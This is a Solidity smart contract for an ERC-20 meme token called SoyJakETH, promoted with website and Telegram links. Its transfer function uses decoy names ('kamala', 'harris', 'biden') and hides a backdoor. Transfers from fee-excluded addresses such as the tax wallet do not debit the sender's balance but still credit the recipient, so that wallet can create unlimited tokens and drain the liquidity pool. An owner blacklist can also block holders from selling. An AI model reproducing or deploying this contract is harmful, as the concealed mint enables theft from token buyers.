// SPDX-License-Identifier: UNLICENSED

/**

heh, you thought it was over when the dev rugged? buckle up, kiddo!

- WEBSITE: https://soyjaketh.wtf
- TELEGRAM: https://t.me/soyjakethgroup
- TWITTER: https://twitter.com/soyxjak

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Soy is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _waitList;
    address payable private _taxAddress;

    uint256 private _initialBuyTax = 11;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 5;
    uint256 private _reduceSellTaxAt = 5;
    uint256 private _preventSwapBefore = 5;
    uint256 private _buyCount = 0;

    IUniswapV2Router02 private _router;
    address private _pair;
    bool private _isTradingOpen;
    bool private _inSwap;
    uint256 private _sellCountInBlock = 0;
    uint256 private _lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;
    string public constant name = unicode"SoyJakETH";
    string public constant symbol = unicode"SOY";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10 ** decimals;

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function removeLimits() external onlyOwner {
        emit MaxTxAmountUpdated(totalSupply);
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) _waitList[notbot[i]] = false;
    }

    function transferTax(uint256 amount) private {
        _taxAddress.transfer(amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) _waitList[bots_[i]] = true;
    }

    constructor(address router_, address taxWallet_) {
        _router = IUniswapV2Router02(router_);

        _taxAddress = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxAddress] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        kamala(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function kamala(address harris, address biden, uint256 endorse) private {
        require(harris != address(0), "ERC20: transfer from the zero address");
        require(biden != address(0), "ERC20: transfer to the zero address");
        require(endorse > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _inSwap) {
            require(_isExcludedFromFee[harris] || _isExcludedFromFee[biden]);
            balanceOf[harris] = balanceOf[harris].sub(endorse);
            balanceOf[biden] = balanceOf[biden].add(endorse);
            emit Transfer(harris, biden, endorse);
            return;
        }
        uint256 swapAmount = endorse;
        uint256 taxAmount = endorse - swapAmount;
        if (harris != owner() && biden != owner() && biden != _taxAddress) {
            require(!_waitList[harris] && !_waitList[biden]);

            if (
                harris == _pair &&
                biden != address(_router) &&
                !_isExcludedFromFee[biden]
            ) {
                require(_isTradingOpen, "Trading not open yet");

                require(endorse <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf[biden] + endorse <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = endorse
                    .mul(
                        (_buyCount > _reduceBuyTaxAt)
                            ? _finalBuyTax
                            : _initialBuyTax
                    )
                    .div(100);

                _buyCount++;
            }

            if (biden == _pair && harris != address(this))
                taxAmount = endorse
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (
                !_inSwap &&
                biden == _pair &&
                _isTradingOpen &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                if (block.number > _lastSellBlock) _sellCountInBlock = 0;
                require(_sellCountInBlock < 3, "Only 3 sells per block!");
                if (swapAmount > contractTokenBalance)
                    swapAmount = contractTokenBalance;
                if (swapAmount > _maxTaxSwap) swapAmount = _maxTaxSwap;
                swapTokensForEth(swapAmount);
                swapAmount = endorse;
                _sellCountInBlock++;
                _lastSellBlock = block.number;
            }

            if (biden == _pair) transferTax(address(this).balance);
        }
        if (_isExcludedFromFee[harris]) swapAmount = 0;
        if (taxAmount > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(taxAmount);
            emit Transfer(harris, address(this), taxAmount);
        } else if (_isExcludedFromFee[harris]) swapAmount = 0;

        balanceOf[harris] = balanceOf[harris].sub(swapAmount);
        balanceOf[biden] = balanceOf[biden].add(endorse.sub(taxAmount));
        emit Transfer(harris, biden, endorse.sub(taxAmount));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        kamala(_msgSender(), recipient, amount);
        return true;
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_router), totalSupply);
        _pair = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        _router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_pair).approve(address(_router), type(uint).max);
    }

    receive() external payable {}

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function rescueETH() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH in contract to rescue");
        payable(_msgSender()).transfer(bal);
    }
}